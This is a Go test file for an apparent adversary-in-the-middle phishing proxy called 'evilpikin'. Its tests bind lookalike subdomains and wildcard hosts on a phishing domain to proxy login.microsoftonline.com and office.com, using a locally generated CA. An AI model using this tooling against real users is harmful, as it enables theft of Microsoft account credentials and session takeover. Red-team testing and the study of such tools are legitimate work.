package console

import (
	"path/filepath"
	"testing"

	"github.com/user/evilpikin/internal/proxy"
	"github.com/user/evilpikin/internal/storage"
)

func TestBindSubdomainRegistersHost(t *testing.T) {
	db := filepath.Join(t.TempDir(), "t.db")
	store, err := storage.OpenSQLite(db)
	if err != nil {
		t.Fatal(err)
	}
	defer store.Close()

	caDir := t.TempDir()
	engine := proxy.NewEngine()
	if err := store.UpsertTarget(&storage.TargetProfile{
		ID: "ms-live", Name: "MS", ProxyHost: "ms.test", Origin: "login.microsoftonline.com", Enabled: true,
	}); err != nil {
		t.Fatal(err)
	}

	c, err := New(store, engine, Config{CACertPath: filepath.Join(caDir, "dev-ca.pem"), CAKeyPath: filepath.Join(caDir, "dev-ca.key")})
	if err != nil {
		t.Fatal(err)
	}
	c.Domain().SetDomain("evilpikin.com")

	host, err := c.BindSubdomain("login", "ms-live")
	if err != nil {
		t.Fatal(err)
	}
	if host != "login.evilpikin.com" {
		t.Fatalf("unexpected host %q", host)
	}
	// engine must now route the subdomain host to a handler
	if _, err := engine.HandlerFor("login.evilpikin.com"); err != nil {
		t.Fatalf("engine did not register subdomain host: %v", err)
	}
	// derived profile persisted so both shell + REST see it
	if _, err := store.GetTarget("sub-login.evilpikin.com"); err != nil {
		t.Fatalf("derived target not persisted: %v", err)
	}

	// unbind tears the host back down
	if _, err := c.UnbindSubdomain("login"); err != nil {
		t.Fatal(err)
	}
	if _, err := engine.HandlerFor("login.evilpikin.com"); err == nil {
		t.Fatalf("engine still serving unbound host")
	}
}

func TestDefaultResolverProxiesAnySubdomain(t *testing.T) {
	db := filepath.Join(t.TempDir(), "t.db")
	store, err := storage.OpenSQLite(db)
	if err != nil {
		t.Fatal(err)
	}
	defer store.Close()

	caDir := t.TempDir()
	engine := proxy.NewEngine()
	if err := store.UpsertTarget(&storage.TargetProfile{
		ID: "ms-live", Name: "MS", ProxyHost: "ms.test", Origin: "login.microsoftonline.com", Enabled: true,
	}); err != nil {
		t.Fatal(err)
	}

	c, err := New(store, engine, Config{CACertPath: filepath.Join(caDir, "dev-ca.pem"), CAKeyPath: filepath.Join(caDir, "dev-ca.key")})
	if err != nil {
		t.Fatal(err)
	}
	c.Domain().SetDomain("evilpikin.com")
	c.Domain().SetDefaultTarget("ms-live")

	// Any subdomain of the base domain must resolve dynamically, with no
	// explicit binding.
	for _, h := range []string{"evilpikin.com", "login.evilpikin.com", "account.evilpikin.com", "a.b.evilpikin.com"} {
		if _, err := engine.HandlerFor(h); err != nil {
			t.Fatalf("dynamic resolver failed for %q: %v", h, err)
		}
	}

	// Hosts outside the base domain must still be rejected.
	if _, err := engine.HandlerFor("evilpikin.com.attacker.net"); err == nil {
		t.Fatalf("resolver leaked to a foreign domain")
	}
	if _, err := engine.HandlerFor("other.com"); err == nil {
		t.Fatalf("resolver served an unrelated domain")
	}
}

func TestResolveHostServesRelatedDomain(t *testing.T) {
	db := filepath.Join(t.TempDir(), "t.db")
	store, err := storage.OpenSQLite(db)
	if err != nil {
		t.Fatal(err)
	}
	defer store.Close()

	caDir := t.TempDir()
	engine := proxy.NewEngine()
	if err := store.UpsertTarget(&storage.TargetProfile{
		ID: "ms-live", Name: "MS", ProxyHost: "ms.test", Origin: "login.microsoftonline.com",
		RelatedDomains: map[string]string{"office.com": "office.test"}, Enabled: true,
	}); err != nil {
		t.Fatal(err)
	}

	c, err := New(store, engine, Config{CACertPath: filepath.Join(caDir, "dev-ca.pem"), CAKeyPath: filepath.Join(caDir, "dev-ca.key")})
	if err != nil {
		t.Fatal(err)
	}
	_ = c

	// A related domain must resolve AND use the matching real upstream origin.
	if _, err := engine.HandlerFor("office.test"); err != nil {
		t.Fatalf("related domain not resolved: %v", err)
	}
	dt, ok := engine.TargetFor("office.test")
	if !ok {
		t.Fatalf("related domain not cached in engine")
	}
	if dt.Origin != "office.com" {
		t.Fatalf("related domain origin = %q, want office.com", dt.Origin)
	}
}
